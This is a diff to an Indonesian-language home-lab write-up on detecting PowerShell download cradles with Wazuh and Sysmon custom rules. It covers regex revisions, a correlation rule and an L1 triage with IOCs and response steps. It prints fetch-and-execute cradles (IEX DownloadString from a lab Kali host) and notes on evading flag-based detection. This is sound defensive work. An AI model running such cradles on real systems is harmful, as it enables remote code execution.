@@ -166,7 +166,7 @@ Konsekuensinya buat lab ini: di Win7 kita **gak bisa** ngandelin 4104. Yang ters
 
 Artinya deteksi harus jalan dari **command-line pattern** (`-EncodedCommand`, `-ExecutionPolicy Bypass`, `DownloadString`) dan **network behavior** (event 3 outbound), bukan dari isi script yang ter-decode.
 
-Gap "gak jadi alert" ini **sudah ditutup** dengan custom rule `100601` (event 1), lalu diperkuat dengan rule korelasi `100602` (event 1 + event 3). Detailnya ada di dua bagian berikutnya.
+Gap "gak jadi alert" ini **sudah ditutup** dengan custom rule `100601` (event 1), dilengkapi `100603` buat download cradle tanpa encoding, lalu diperkuat dengan rule korelasi `100602` (event 1 + event 3). Detailnya ada di tiga bagian berikutnya.
 
 ---
 
@@ -180,20 +180,39 @@ Rule turunan yang naikin Sysmon Event 1 PowerShell-encoded jadi alert level 12. 
         <if_sid>61603</if_sid>
         <field name="win.system.eventID" type="pcre2">1</field>
         <field name="win.eventdata.image" type="pcre2">.*\\powershell\.exe</field>
-        <field name="win.eventdata.commandLine" type="pcre2">-EncodedCommand</field>
-        <field name="win.eventdata.commandLine" type="pcre2">-NoProfile</field>
+        <field name="win.eventdata.commandLine" type="pcre2">(?i)\s[-/]e[a-z]*\s+[A-Za-z0-9+/]{20,}={0,2}</field>
+        <field name="win.eventdata.commandLine" type="pcre2">(?i)-NoProfile|-nop</field>
         <description>Sysmon: Command line execution of powershell.exe with -EncodedCommand and -NoProfile flags detected</description>
         <mitre>
             <id>T1059.001</id>
         </mitre>
-        <group>command_injection,command_scripting,</group>
+        <group>command_injection,command_scripting,powershell_suspicious_exec,</group>
     </rule>
 </group>
 ```
 
 - **`if_sid` 61603** — chain dari rule bawaan Sysmon Event 1 (level 0), jadi decoding-nya diwarisi, rule ini tinggal nambah kondisi.
-- **Dua `<field>` di `commandLine`** — di-AND: command line wajib mengandung `-EncodedCommand` **dan** `-NoProfile`. Valid karena satu string bisa memuat dua substring.
+- **Dua `<field>` di `commandLine`** — di-AND: command line wajib punya flag encoded (lengkap maupun singkatan) yang diikuti blob base64, **dan** `-NoProfile`/`-nop`.
 - **`win.system.eventID` 1** — redundant sama `if_sid` 61603 (yang udah mastiin event 1); disimpan sebagai self-documenting.
+- **Group `powershell_suspicious_exec`** — dipakai `100602` buat korelasi (lihat bagian 100602).
+
+### Revisi regex: bypass lewat singkatan flag
+
+Versi pertama rule ini pakai pola literal `-EncodedCommand` dan `-NoProfile`. Masalahnya, PowerShell nerima **singkatan parameter** (`-e`, `-ec`, `-enc`, `-EncodedC`, `-nop`, ...) dan gak peduli huruf besar/kecil, sedangkan regex pcre2 case-sensitive. Di lab, `-nop -enc <base64>` dan `-encodedcommand` (huruf kecil) **gak ke-trigger**. Karena `100602` korelasi ke rule ini, korelasinya ikut buta.
+
+Perbaikannya lewat dua tahap:
+
+| Versi | Regex flag encoded | Masalah |
+|-------|--------------------|---------|
+| 1 | `-EncodedCommand` | Singkatan dan huruf kecil lolos |
+| 2 | `(?i)-EncodedCommand\|-enc\|-e\|-ec` | `-e` juga match `-ExecutionPolicy`, jadi cradle **tanpa** encoding ikut ke-flag sebagai "EncodedCommand" |
+| 3 (final) | `(?i)\s[-/]e[a-z]*\s+[A-Za-z0-9+/]{20,}={0,2}` | — |
+
+Versi final syaratnya **flag diawali `e` + blob base64 panjang** sesudahnya. Semua singkatan (`-e` sampai `-EncodedCommand`, juga bentuk `/enc`) ketangkep, sedangkan `-ExecutionPolicy Bypass` gak match karena `Bypass` bukan blob base64 20+ karakter.
+
+Versi 2 penting dicatat karena efeknya mirip kasus 92101 di bawah. `100601` dan `100603` sama-sama child `61603`, dan child pertama yang match yang menang. Dengan regex versi 2, cradle polos bakal berhenti di `100601` dengan label yang salah, dan `100603` gak pernah dicek.
+
+**Gap yang masih ada:** syarat `-NoProfile`/`-nop` tetap wajib. Encoded command **tanpa** `-nop` gak ke-flag `100601`.
 
 ### Pelajaran penting: decoder logtest ≠ decoder produksi
 
@@ -224,14 +243,46 @@ Field `decoder.name: windows_eventchannel` di alert live inilah bukti telak yang
 
 ---
 
+## Custom Detection Rule — 100603 (Download Cradle Tanpa Encoding)
+
+`100601` cuma nangkep cradle yang di-encode. Attacker bisa aja nulis cradle yang sama secara polos:
+
+```cmd
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.43.111:4000/test.txt')"
+```
+
+Gak ada `-EncodedCommand`, jadi `100601` diam. Padahal command line-nya justru lebih gampang dibaca: method download-nya kelihatan langsung di event 1.
+
+```xml
+<rule id="100603" level="12">
+    <if_sid>61603</if_sid>
+    <field name="win.system.eventID" type="pcre2">1</field>
+    <field name="win.eventdata.image" type="pcre2">.*\\powershell\.exe</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)DownloadString|DownloadFile|DownloadData|Net\.WebClient</field>
+    <description>Sysmon: Command line execution of powershell.exe with DownloadString, DownloadFile, DownloadData, or Net.WebClient detected</description>
+    <mitre>
+        <id>T1059.001</id>
+    </mitre>
+    <group>command_injection,command_scripting,powershell_suspicious_exec,</group>
+</rule>
+```
+
+- **Gak bentrok sama `100601`.** Di command yang di-encode, kata `DownloadString` dan kawan-kawan tersembunyi di dalam base64, jadi pola ini gak match.
+- **`IEX` sengaja gak diwajibkan.** `DownloadFile` tanpa `IEX` (payload disimpan ke disk) juga mencurigakan.
+- **Group `powershell_suspicious_exec`** sama dengan `100601`, supaya `100602` bisa korelasi dari dua rule ini sekaligus.
+
+**Hasil live:** command cradle polos di atas fire `100603`, lalu `100602` menyusul waktu proses yang sama konek ke Kali. Payload encoded dari Step 2 tetap fire `100601` → `100602`.
+
+---
+
 ## Custom Correlation Rule — 100602 (Event 1 → Event 3)
 
-`100601` cuma bilang "ada PowerShell encoded yang jalan". Itu belum tentu jahat, karena script admin dan tool deployment juga sering pakai `-EncodedCommand`. Sinyal yang jauh lebih kuat: **proses PowerShell encoded yang sama langsung bikin koneksi keluar**. Itu pola download cradle atau C2 beacon yang ditiru di lab ini. Jadi `100602` mengkorelasikan event 1 (lewat `100601`) dengan event 3 (network connect) yang datang sesudahnya.
+`100601` dan `100603` cuma bilang "ada PowerShell mencurigakan yang jalan". Itu belum tentu jahat, karena script admin dan tool deployment juga sering pakai `-EncodedCommand` atau `Net.WebClient`. Sinyal yang jauh lebih kuat: **proses PowerShell yang sama langsung bikin koneksi keluar**. Itu pola download cradle atau C2 beacon yang ditiru di lab ini. Jadi `100602` mengkorelasikan event 1 (lewat `100601` atau `100603`) dengan event 3 (network connect) yang datang sesudahnya.
 
 ```xml
 <rule id="100602" level="14" timeframe="60">
     <if_sid>61605, 92101</if_sid>
-    <if_matched_sid>100601</if_matched_sid>
+    <if_matched_group>powershell_suspicious_exec</if_matched_group>
     <same_field>win.eventdata.ProcessGuid</same_field>
     <field name="win.eventdata.image" type="pcre2">.*\\powershell\.exe</field>
     <description>Sysmon - Event 3: Network connection to $(win.eventdata.destinationIp):$(win.eventdata.destinationPort) by $(win.eventdata.image) Outbound Connection from Powershell.exe -EncodedCommand before.</description>
@@ -246,12 +297,19 @@ Field `decoder.name: windows_eventchannel` di alert live inilah bukti telak yang
 | Tag | Fungsi |
 |-----|--------|
 | `<if_sid>61605, 92101</if_sid>` | Event yang **sedang masuk** harus event 3. Dua parent di sini dibaca **OR**, dan alasannya jadi inti temuan lab ini (lihat bawah). |
-| `<if_matched_sid>100601</if_matched_sid>` + `timeframe="60"` | Dalam 60 detik terakhir **harus sudah ada** alert `100601` (encoded PS). |
+| `<if_matched_group>powershell_suspicious_exec</if_matched_group>` + `timeframe="60"` | Dalam 60 detik terakhir **harus sudah ada** alert dari group itu, yaitu `100601` (encoded) atau `100603` (cradle polos). |
 | `<same_field>` | Ikat event 3 ke proses yang sama dengan event 1 yang di-match. |
 | `<field name="win.eventdata.image">` | Koneksinya harus dari `powershell.exe`. |
-| Level 14 | Lebih tinggi dari `100601` (12), karena dua sinyal berurutan lebih meyakinkan dari satu. |
+| Level 14 | Lebih tinggi dari `100601`/`100603` (12), karena dua sinyal berurutan lebih meyakinkan dari satu. |
 
-`if_sid` dan `if_matched_sid` punya peran berbeda. `if_sid` ngecek event yang **sekarang** masuk (event 3), sedangkan `if_matched_sid` ngecek event yang **sudah terjadi sebelumnya** (event 1 yang jadi `100601`). Jadi korelasi dua rule berbeda bisa dilakukan tanpa ngisi dua-duanya ke `if_sid`.
+`if_sid` dan `if_matched_*` punya peran berbeda. `if_sid` ngecek event yang **sekarang** masuk (event 3), sedangkan `if_matched_sid`/`if_matched_group` ngecek event yang **sudah terjadi sebelumnya** (event 1 yang jadi `100601`/`100603`). Jadi korelasi dua rule berbeda bisa dilakukan tanpa ngisi dua-duanya ke `if_sid`.
+
+Versi awal rule ini pakai `<if_matched_sid>100601</if_matched_sid>`. Waktu `100603` ditambah, `if_matched_sid` gak bisa diisi lebih dari satu ID, jadi diganti ke `if_matched_group`. `same_field` tetap berlaku di jalur `if_matched_group` (dicek di source Wazuh 4.13.1, `src/analysisd/eventinfo.c`).
+
+Dua hal yang sempat hampir salah waktu nambah `100603`:
+
+- **Jangan taruh `100603` di `if_sid` 100602.** `100603` itu rule event 1, sedangkan `if_sid` ngecek event yang sedang masuk. Kalau ditaruh di situ, `100602` malah dicek di event 1 cradle, bukan di event 3 koneksinya, dan korelasi cradle → koneksi gak pernah kejadian.
+- **Group `powershell_suspicious_exec` gak dipasang di `100602`.** Kalau dipasang, alert `100602` sebelumnya ikut jadi bahan korelasi `100602` berikutnya.
 
 ### Problem: event 3 PowerShell "hilang" sebelum sampai ke rule kita
 
@@ -328,11 +386,120 @@ Trigger ulang payload yang sama dari Step 2. Di `wazuh-alerts-*` muncul pasangan
 | `Image` | `powershell.exe` | `powershell.exe` |
 | `destinationIp` | — | `192.168.43.111` (Kali) |
 
-Proses yang sama (GUID dan PID identik) bikin koneksi ke Kali **240 ms** setelah dibuat. Di Manager, `100601` tercatat duluan dan `100602` menyusul sekitar 2 detik kemudian, sesuai urutan yang dibutuhkan `if_matched_sid`.
+Proses yang sama (GUID dan PID identik) bikin koneksi ke Kali **240 ms** setelah dibuat. Di Manager, `100601` tercatat duluan dan `100602` menyusul sekitar 2 detik kemudian, sesuai urutan yang dibutuhkan korelasi. Run ini masih pakai versi awal (`if_matched_sid 100601`). Setelah diganti ke `if_matched_group`, jalur encoded dites ulang dan tetap fire.
 
 ![Correlation alert 100601 → 100602 di Wazuh Dashboard](./assets/correlation_log_rule_alert_siem.png)
 
-> **Catatan validasi:** run ini membuktikan jalur `100601 → 100602` fire untuk pasangan event yang benar. Yang **belum** diuji terpisah adalah apakah `same_field` benar-benar menolak koneksi dari proses PowerShell **lain** dalam 60 detik yang sama (uji negatif). Perlu diperhatikan juga, decoder eventchannel ngeluarin nama field `processGuid` (huruf `p` kecil), sedangkan rule di atas menulis `ProcessGuid`.
+> **Catatan validasi:** run ini membuktikan jalur `100601 → 100602` fire untuk pasangan event yang benar. Yang **belum** diuji terpisah adalah apakah `same_field` benar-benar menolak koneksi dari proses PowerShell **lain** dalam 60 detik yang sama (uji negatif).
+>
+> **Soal casing `same_field`:** di lab ini, `win.eventdata.ProcessGuid` (P besar) bikin `100602` fire, sedangkan `win.eventdata.processGuid` (p kecil) nggak. Hasil ini dicatat apa adanya. Di source Wazuh 4.13.1, nama field dynamic dicari tanpa peduli huruf besar/kecil (`FindField()` pakai `strcasecmp`), jadi penyebab bedanya belum diverifikasi. Rencananya dicek ulang setelah raw event bisa dicari di `wazuh-archives-*`.
+
+---
+
+## Analisis Alert — Triage L1
+
+Bagian ini ditulis dari sudut pandang analis L1 yang nerima alert `100602` tanpa tahu kalau ini lab. Query awal di Dashboard:
+
+```
+agent.name:"WIN7-VICTIM" and data.win.eventdata.image~powershell.exe
+```
+
+Hasilnya ada dua event yang relevan dengan serangan.
+
+### Timeline
+
+Timeline insiden pakai **waktu kejadian** dari Sysmon (`UtcTime`, dikonversi ke WIB/UTC+7), bukan `@timestamp` Dashboard. `@timestamp` adalah waktu event **masuk Manager**, dan di run ini selisihnya sekitar 8–9 detik. Kalau nanti dicocokin sama log sumber lain (web server, pfSense), acuannya harus waktu kejadian.
+
+| Waktu kejadian (WIB) | Masuk Manager | Event | Rule | Detail |
+|----------------------|---------------|-------|------|--------|
+| 21:31:11.765 | 21:31:19.441 | 1 Process Create | `100601` | Parent `cmd.exe` → `powershell.exe` (PID 3364), command line encoded |
+| 21:31:12.005 | 21:31:21.532 | 3 Network Connect | `100602` | PID 3364 → `192.168.43.111:4000` TCP, user `LAB\Administrator` |
+
+Kedua event punya `ProcessGuid` `{AF48A474-4B2F-6AAD-0000-0010904D1100}` dan `ProcessId` 3364 yang sama. Artinya ini **satu proses**, dan koneksinya terjadi **240 ms** setelah proses dibuat.
+
+### Apa yang terjadi
+
+Command line event 1:
+
+```
+powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0A...
+```
+
+Hasil decode base64 (UTF-16LE):
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.43.111:4000/test.txt')
+```
+
+PowerShell narik `test.txt` dari `192.168.43.111` port 4000, lalu langsung dieksekusi di memory lewat `IEX` tanpa disimpan ke disk (fileless). Event 3 dengan tujuan `192.168.43.111:4000` cocok dengan URL di dalam payload.
+
+### Yang sudah terbukti vs belum
+
+| Klaim | Status | Dasar |
+|-------|--------|-------|
+| PowerShell dijalankan dengan `-EncodedCommand` + `-ExecutionPolicy Bypass` + `-NoProfile`, parent `cmd.exe` | ✅ Terbukti | Event 1 |
+| Proses yang sama bikin koneksi TCP ke `192.168.43.111:4000` | ✅ Terbukti | Event 3, GUID & PID sama |
+| `test.txt` beneran ke-download | ❓ Belum | Event 3 cuma bukti ada koneksi. Butuh log web server di `192.168.43.111` (request `/test.txt` + status HTTP) |
+| Isi `test.txt` dieksekusi | ❓ Belum | Win7 (PowerShell 2.0) gak punya 4104. Jejak yang bisa dicari: child process dari PID 3364 |
+| Command diketik user atau dipicu file/proses lain | ❓ Belum | Parent `cmd.exe` perlu ditelusuri ke atas lewat `parentProcessGuid` |
+
+### Batasan query
+
+Setelah dua event itu, query di atas gak nunjukin event lain. Tapi filter `image~powershell.exe` punya dua titik buta:
+
+- **Child process.** Proses yang di-spawn PowerShell punya `Image` lain (`cmd.exe`, `whoami.exe`, dll.). PowerShell cuma muncul sebagai parent-nya.
+- **Event 3 `<unknown process>`.** Kalau PowerShell udah exit sebelum Sysmon nulis event network, `Image` jadi `<unknown process>` (lihat temuan samping di atas).
+
+Query lanjutan buat nutup dua titik buta itu (**belum dijalankan**):
+
+```
+agent.name:"WIN7-VICTIM" and data.win.eventdata.parentProcessGuid:"{AF48A474-4B2F-6AAD-0000-0010904D1100}"
+agent.name:"WIN7-VICTIM" and data.win.eventdata.processId:"3364"
+```
+
+Event Sysmon yang level 0 gak masuk `wazuh-alerts-*`, jadi query ini perlu dijalankan di `wazuh-archives-*`.
+
+### IOC
+
+| Tipe | Nilai |
+|------|-------|
+| Host | `WIN7-VICTIM` (`10.10.20.10`) |
+| User | `LAB\Administrator` |
+| Proses | `powershell.exe`, PID 3364, GUID `{AF48A474-4B2F-6AAD-0000-0010904D1100}` |
+| Parent | `cmd.exe` |
+| Tujuan | `192.168.43.111:4000/TCP` |
+| URL | `http://192.168.43.111:4000/test.txt` |
+
+`192.168.43.111` adalah IP private di subnet hotspot, dan gak ada di inventaris aset lab. Cek reputasi ke VirusTotal gak ada gunanya buat IP private, jadi pivot-nya ke internal: host apa yang pegang IP itu (DHCP lease/ARP), dan kenapa dia nyediain file di port non-standar 4000.
+
+### MITRE ATT&CK
+
+| Technique | Alasan |
+|-----------|--------|
+| T1059.001 — PowerShell | Eksekusi lewat `powershell.exe` |
+| T1027 — Obfuscated Files or Information | Command disembunyikan pakai base64 `-EncodedCommand` |
+| T1105 — Ingress Tool Transfer | Narik payload dari host luar |
+| T1071.001 — Web Protocols | Komunikasi ke C2 tiruan lewat HTTP |
+
+### Verdict
+
+Status TP/FP **belum final**, karena file yang ke-download dan asal command-nya belum terkonfirmasi. Tapi kombinasi sinyalnya cukup buat **eskalasi ke L2 dengan severity High**:
+
+- encoded command + `-ExecutionPolicy Bypass` + `-NoProfile`
+- download cradle `IEX ... DownloadString` (fileless)
+- koneksi ke host di luar inventaris, di port non-standar
+- jalan sebagai **akun admin domain** (`LAB\Administrator`)
+
+Alert ini cuma bisa jadi FP kalau ada admin yang memang menjalankan script itu secara sah. Itu dikonfirmasi ke pemilik akun.
+
+### Rekomendasi respons
+
+1. **Isolasi host** dari jaringan. Isolasi jaringan gak menghapus isi memory, jadi bisa dilakukan duluan.
+2. **Ambil memory dump sebelum reboot atau cleanup.** Payload fileless cuma ada di memory. Memory dump nunjukin kondisi saat dump diambil, bukan histori jam 21:31. Histori tetap dari log.
+3. **Telusuri parent chain.** `cmd.exe` dipanggil siapa? Kalau `explorer.exe`, berarti diketik interaktif. Kalau `wmiprvse.exe`, `services.exe`, atau aplikasi Office, ada mekanisme lain yang memicu.
+4. **Cari aktivitas lanjutan** dari proses ini (child process, koneksi lain) pakai query di bagian Batasan query.
+5. **Identifikasi `192.168.43.111`**, dan cari host lain yang juga konek ke IP/port itu buat nentuin scope.
+6. **Akun `LAB\Administrator`:** cek logon akun ini di host lain, terutama DC (`10.10.10.20`), dan pertimbangkan reset password.
 
 ---
 
@@ -342,6 +509,8 @@ Eksekusi PowerShell download-cradle di Win7 berhasil disimulasikan dan **tertang
 
 Gap "gak jadi alert" (rule bawaan level 0) **sudah ditutup** dengan custom rule `100601` — encoded PowerShell execution sekarang naik jadi alert level 12 di Dashboard, ter-map ke T1059.001. Sepanjang jalan ketemu pelajaran mahal: decoder di `wazuh-logtest` (`json`) beda dari decoder produksi (`windows_eventchannel`), jadi rule yang chain ke rule bawaan Sysmon **cuma bisa divalidasi live**, bukan lewat logtest.
 
-Deteksi lalu diperkuat dengan rule korelasi `100602`: encoded PowerShell (`100601`) yang dalam 60 detik bikin koneksi keluar dari proses yang sama naik jadi alert level 14 (T1071.001 + T1059.001). Pelajaran terbesarnya bukan di sintaks korelasi, tapi di **struktur pohon rule**. Rule bawaan 92101 (level 0) nempel ke 61605 lewat `if_group`, lalu diam-diam nangkep semua koneksi TCP PowerShell sebelum rule custom sempat dicek. Fix-nya: pasang rule custom di dua jalur (`61605, 92101`), tanpa ngubah rule bawaan.
+Regex `100601` kemudian direvisi supaya singkatan flag (`-nop -enc`, `-e`) gak bisa lolos, dan ditambah `100603` buat download cradle yang ditulis polos tanpa encoding.
 
-Keterbatasan yang tetap berlaku: PowerShell 2.0 di Win7 gak punya Script Block Logging (4104), jadi deteksi bersandar ke command-line pattern (`-EncodedCommand` + `-NoProfile`) — bukan isi script yang ter-decode. Di sisi network, Sysmon kadang gagal ngisi `Image`/`ProcessGuid` di event 3 buat proses yang umurnya pendek (`<unknown process>`), jadi korelasi berbasis GUID dan image bisa bolong di run seperti itu.
+Deteksi lalu diperkuat dengan rule korelasi `100602`: PowerShell mencurigakan (`100601` atau `100603`) yang dalam 60 detik bikin koneksi keluar dari proses yang sama naik jadi alert level 14 (T1071.001 + T1059.001). Pelajaran terbesarnya bukan di sintaks korelasi, tapi di **struktur pohon rule**. Rule bawaan 92101 (level 0) nempel ke 61605 lewat `if_group`, lalu diam-diam nangkep semua koneksi TCP PowerShell sebelum rule custom sempat dicek. Fix-nya: pasang rule custom di dua jalur (`61605, 92101`), tanpa ngubah rule bawaan.
+
+Keterbatasan yang tetap berlaku: PowerShell 2.0 di Win7 gak punya Script Block Logging (4104), jadi deteksi bersandar ke command-line pattern (flag encoded, `-NoProfile`, method download) — bukan isi script yang ter-decode. Encoded command tanpa `-NoProfile` juga masih lolos dari `100601`. Di sisi network, Sysmon kadang gagal ngisi `Image`/`ProcessGuid` di event 3 buat proses yang umurnya pendek (`<unknown process>`), jadi korelasi berbasis GUID dan image bisa bolong di run seperti itu.
